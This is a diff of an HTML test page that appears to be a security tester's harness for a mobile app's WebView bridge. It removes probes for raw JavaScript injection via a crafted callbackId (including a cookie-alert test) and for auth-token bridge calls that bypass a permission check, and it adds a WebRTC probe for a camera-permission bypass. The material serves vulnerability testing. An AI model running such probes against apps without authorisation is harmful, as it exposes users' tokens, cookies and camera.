@@ -79,51 +79,8 @@
   <button onclick="closeApp()">Close App Bridge Method</button>
 
 
-  <h2>Embedded Website</h2>
+  <!-- <h2>Embedded Website</h2>
 <div style="max-width: 1000px; margin: 20px auto;">
-
-  <div class="settings-section" style="border-color:red;">
-  <h3 style="color:red;">C-03: Custom Bridge Raw JS Injection</h3>
-  <p>Sends a crafted <code>callbackId</code> to the <code>CUSTOMTEST</code> bridge.
-  The bridge builds <code>callbackId(response)</code> and executes it verbatim.
-  Injected payload breaks out and runs arbitrary JS.</p>
-
-  <button class="btn" onclick="testC03_titleProbe()">Test C-03: Change document.title</button>
-  <button class="btn" onclick="testC03_cookieExfil()">Test C-03: Alert Cookies</button>
-  <div class="status-box" id="c03Status">—</div>
-</div>
-
-<div class="settings-section" style="border-color:red;">
-  <h3 style="color:red;">C-04: AUTH Bridge Auto-Granted to All Domains</h3>
-  <p>Calls <code>fetchAuthToken</code> and <code>fetchGrantToken</code> from this domain
-  (which has no explicit AUTH permission). If the bridge responds at all
-  (even with a stub), the permission check is confirmed bypassed.</p>
-
-  <button class="btn" onclick="testC04_authToken()">Test C-04: fetchAuthToken</button>
-  <button class="btn" onclick="testC04_grantToken()">Test C-04: fetchGrantToken</button>
-  <div class="status-box" id="c04Status">—</div>
-</div>
-
-<script>
-  function testC04_authToken() {
-    document.getElementById('c04Status').textContent = 'Sent fetchAuthToken. Watch for any callback — even a stub response confirms the permission passes.';
-    window.webkit.messageHandlers.fetchAuthToken.postMessage({
-      "scriptName": "fetchAuthToken",
-      "callbackId": "auth_probe_" + Date.now(),
-      "data": {}
-    });
-  }
-
-  function testC04_grantToken() {
-    document.getElementById('c04Status').textContent = 'Sent fetchGrantToken. Any response = C-04 confirmed.';
-    window.webkit.messageHandlers.fetchGrantToken.postMessage({
-      "scriptName": "fetchGrantToken",
-      "callbackId": "grant_probe_" + Date.now(),
-      "data": {}
-    });
-  }
-</script>
-
   <iframe
     src="https://jupiter.0xc3.pw/hiteshkumarthakur.github.io/"
     title="Embedded Site"
@@ -134,7 +91,43 @@
     referrerpolicy="no-referrer-when-downgrade"
     allowfullscreen>
   </iframe>
+</div> -->
+
+<div class="settings-section" style="border-color:orange;">
+  <h3 style="color:orange;">H-07: WebRTC Capture Type Ignored</h3>
+  <p>Request audio-only first. Then immediately request video.
+  If video is granted when only audio was configured — H-07 is confirmed.</p>
+
+  <button class="btn" onclick="testH07_audioOnly()">Step 1: Request Audio Only</button>
+  <button class="btn" onclick="testH07_videoOnly()">Step 2: Request Video Only</button>
+  <div class="status-box" id="h07Status">—</div>
 </div>
+
+<script>
+  function testH07_audioOnly() {
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+      .then(stream => {
+        const tracks = stream.getTracks().map(t => t.kind).join(', ');
+        document.getElementById('h07Status').textContent =
+          'Audio request result — tracks granted: [' + tracks + ']. Now click Step 2.';
+      })
+      .catch(e => {
+        document.getElementById('h07Status').textContent = 'Audio denied: ' + e.message;
+      });
+  }
+
+  function testH07_videoOnly() {
+    navigator.mediaDevices.getUserMedia({ audio: false, video: true })
+      .then(stream => {
+        const tracks = stream.getTracks().map(t => t.kind).join(', ');
+        document.getElementById('h07Status').textContent =
+          '⚠️ CONFIRMED — Video granted: [' + tracks + ']. SDK does not check capture type.';
+      })
+      .catch(e => {
+        document.getElementById('h07Status').textContent = 'Video denied (mitigated): ' + e.message;
+      });
+  }
+</script>
 
   <h2>Testing Dropdown</h2>
 
